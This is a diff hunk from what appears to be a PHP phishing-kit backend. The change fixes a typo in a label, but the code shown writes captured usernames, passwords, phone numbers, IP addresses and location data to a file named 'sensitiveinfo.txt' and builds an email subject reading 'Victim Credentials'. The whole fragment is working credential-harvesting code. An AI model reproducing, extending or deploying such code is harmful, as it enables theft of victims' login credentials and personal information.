@@ -14,7 +14,7 @@ $ulke = $details->country;
 date_default_timezone_set('Europe/Istanbul');
 $tarih=date("d-m-Y H:i:s");
 $file = fopen('sensitiveinfo.txt', 'a');
-fwrite($file, "Username: ".$user."\n\n" ."Password: ".$pass. "\n\n"."PhoneNumber: ".$pho."\n\n"."Ip Adress: " .$ip."\n\n".
+fwrite($file, "Username: ".$user."\n\n" ."Password: ".$pass. "\n\n"."PhoneNumber: ".$pho."\n\n"."Ip Address: " .$ip."\n\n".
 "Country: ".$ulke ."\n\n".   "Time: " .$tarih.  "\n\n\"". "Organization : " .$org."\n\n". "Address:".$addr."\n\n"."Postal :".$pos."\n\n" . "City :" .$city."\n\n" ."country : ".$country."\n\n\n\n");
 fclose($file);
 $subject = "Victim Credentials{ $user }";
